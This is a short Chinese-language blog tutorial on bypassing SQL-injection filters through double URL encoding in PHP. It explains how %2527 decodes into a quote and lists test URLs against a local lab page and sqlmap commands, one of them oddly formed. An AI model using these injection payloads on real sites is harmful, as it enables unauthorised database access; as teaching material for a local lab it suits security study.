---
layout: post
title: "1.4.2-SQL注入防御绕过-二次编码注入"
date: 2018-07-06
category: web安全
tags: sql注入
---

## 01 二次编码注入原理

+，=，&，；  
原始数据不适合传输  

	index.php?id=1&name=admin&pwd=123

	name=admin=
	name=admin&

	admin=

	php urldecode('%3d') --> =

	// 如果这样的参数会引起歧义

php会自动解码  

二次编码注入：  
urldecode()与PHP本身处理编码时，两者配合失误，可构造数据消灭\  

![]({{site.img_link}}/10/01.png)
![]({{site.img_link}}/10/02.png)




## 02 二次编码注入方法

![]({{site.img_link}}/10/03.png)

![]({{site.img_link}}/10/04.png)


	http://127.0.0.1/Less-1/double.php?id=1%2527 // 测试注入点
	http://127.0.0.1/Less-1/double.php?id=1%2527%20order%20by%203 //测试长度
	http://127.0.0.1/Less-1/double.php?id=1%27 order by 4--+
	http://127.0.0.1/


	sqlmap:
	sqlmap -u "http://127.0.0.1/Less-1/double.php?id=1%25"

	sqlmap -u "http://127.0.0.1/Less-1/double.php?id=1%2527" --current--+

![]({{site.img_link}}/10/05.png)

